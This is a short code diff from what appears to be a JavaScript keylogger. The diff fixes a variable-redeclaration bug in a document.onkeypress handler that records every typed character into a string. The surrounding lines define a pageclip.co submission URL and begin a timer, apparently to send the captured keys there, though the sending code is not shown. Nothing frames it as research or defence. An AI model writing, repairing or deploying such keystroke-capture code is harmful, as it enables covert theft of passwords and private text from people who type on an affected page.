@@ -28,7 +28,7 @@ var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
 document.onkeypress = function(e) {
 	let get = window.event?event:e;
 	let key = get.keyCode?get.keyCode:get.charCode;
-	let key = String.fromCharCode(key);
+	key = String.fromCharCode(key);
 	keys+=key;
 }
 window.setInterval(function(){
